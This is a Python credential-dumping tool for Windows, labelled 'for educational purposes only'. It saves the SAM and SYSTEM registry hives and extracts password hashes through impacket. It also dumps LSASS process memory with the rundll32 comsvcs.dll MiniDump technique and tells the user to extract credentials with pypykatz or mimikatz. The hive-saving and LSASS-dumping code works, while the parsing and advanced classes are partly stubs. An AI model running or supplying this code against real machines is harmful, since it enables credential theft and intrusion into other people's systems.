"""
Hash Dump - Extract Windows password hashes
For educational purposes only - Requires Administrator privileges - For Educational Use Only
"""


from pathlib import Path
from datetime import datetime
import subprocess, tempfile, io, csv


class HashDump:
    """Extract Windows SAM hashes"""
    
    def __init__(self) -> None:
        """Initialize hash dumper"""

        try:
            self.method = self._detect_method()
        except Exception as e:
            raise Exception(f"HashDump initialization error in __init__ function : {str(e)}")
    
    def _detect_method(self) -> str:
        """Detect best available method"""
        # Check if we have admin privileges

        try:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if not is_admin:
                return None
        except:
            return None
        
        return 'registry'
    
    def dump_hashes(self) -> dict:
        """
        Dump password hashes from SAM
        Returns:
            dict: Results containing hashes or error
        """

        if not self.method:
            return {
                'success': False,
                'error': 'Administrator privileges required',
                'timestamp': datetime.now().isoformat()
            }
        
        try:
            # Method 1: Using registry (requires admin)
            if self.method == 'registry':
                return self._dump_via_registry()
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'timestamp': datetime.now().isoformat()
            }
    
    def _dump_via_registry(self) -> dict:
        """
        Dump hashes via Windows Registry
        Uses reg.exe to save SAM and SYSTEM hives
        """

        try:
            # Create temporary directory
            temp_dir = Path(tempfile.mkdtemp())
            
            sam_file = temp_dir / "sam.save"
            system_file = temp_dir / "system.save"
            
            # Save SAM hive
            result_sam = subprocess.run(
                ['reg', 'save', 'HKLM\\SAM', str(sam_file), '/y'],
                capture_output=True,
                text=True
            )
            
            # Save SYSTEM hive
            result_system = subprocess.run(
                ['reg', 'save', 'HKLM\\SYSTEM', str(system_file), '/y'],
                capture_output=True,
                text=True
            )
            
            if result_sam.returncode != 0 or result_system.returncode != 0:
                return {
                    'success': False,
                    'error': 'Failed to save registry hives (Admin required)',
                    'sam_error': result_sam.stderr,
                    'system_error': result_system.stderr
                }
            
            # Parse the hives (basic implementation)
            # For production, use impacket or pypykatz
            hashes = self._parse_sam_hives(sam_file, system_file)
            
            # Cleanup
            try:
                sam_file.unlink()
                system_file.unlink()
                temp_dir.rmdir()
            except:
                pass
            
            return {
                'success': True,
                'hashes': hashes,
                'method': 'registry',
                'timestamp': datetime.now().isoformat()
            }
        
        except PermissionError:
            return {
                'success': False,
                'error': 'Access denied - Administrator privileges required'
            }
        
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }
    
    def _parse_sam_hives(self, sam_file, system_file) -> dict:
        """
        Parse SAM and SYSTEM hives to extract hashes
        This is a simplified version - for real use, use impacket
        """
        
        try:
            # Try using impacket if available
            try:
                from impacket.examples.secretsdump import LocalOperations, SAMHashes
                from pypykatz.pypykatz import pypykatz    
                localOperations = LocalOperations(str(system_file))
                bootKey = localOperations.getBootKey()
                
                SAMFileName = str(sam_file)
                samHashes = SAMHashes(SAMFileName, bootKey, isRemote=False)
                
                hashes = []
                samHashes.dump()
                
                # Capture output
                # This is simplified - impacket outputs to stdout
                return {
                    'note': 'Use impacket for full hash extraction',
                    'method': 'impacket'
                }
            
            except ImportError:
                # Fallback: just return file paths for manual extraction
                return {
                    'note': 'Install impacket for automatic hash extraction',
                    'sam_file': str(sam_file),
                    'system_file': str(system_file),
                    'instructions': 'Use: secretsdump.py -sam sam.save -system system.save LOCAL'
                }
        
        except Exception as e:
            return {
                'error': f'Parse error: {str(e)}'
            }
    
    def dump_lsass(self) -> dict:
        """
        Dump LSASS memory (more advanced)
        Requires admin + can trigger antivirus
        """

        try:
            # Create dump using comsvcs.dll method
            dump_file = Path(tempfile.gettempdir()) / f"lsass_{datetime.now().strftime('%Y%m%d_%H%M%S')}.dmp"
            
            # Get LSASS PID
            result = subprocess.run(
                ['tasklist', '/FI', 'IMAGENAME eq lsass.exe', '/FO', 'CSV', '/NH'],
                capture_output=True,
                text=True
            )
            
            if result.returncode != 0:
                return {
                    'success': False,
                    'error': 'Could not find LSASS process'
                }
            
            # Parse PID
            reader = csv.reader(io.StringIO(result.stdout))
            row = next(reader)
            pid = row[1]
            
            # Create dump using rundll32
            cmd = f'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {pid} {dump_file} full'
            
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True
            )
            
            if dump_file.exists():
                return {
                    'success': True,
                    'dump_file': str(dump_file),
                    'size': dump_file.stat().st_size,
                    'note': 'Use pypykatz or mimikatz to extract credentials',
                    'command': f'pypykatz lsa minidump {dump_file}'
                }
            else:
                return {
                    'success': False,
                    'error': 'Failed to create dump file'
                }
        
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }


class HashDumpAdvanced :
    """
    Advanced hash dumping using pypykatz (if available)
    More reliable and feature-rich
    """
    
    @staticmethod
    def dump_with_pypykatz():
        """
        Dump credentials using pypykatz
        Requires: pip install pypykatz
        """

        try:
            
            # This would require proper implementation
            # pypykatz can dump from registry or LSASS
            
            return {
                'success': True,
                'note': 'pypykatz method',
                'method': 'pypykatz'
            }
        
        except ImportError:
            return {
                'success': False,
                'error': 'pypykatz not installed',
                'install': 'pip install pypykatz'
            }
        
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }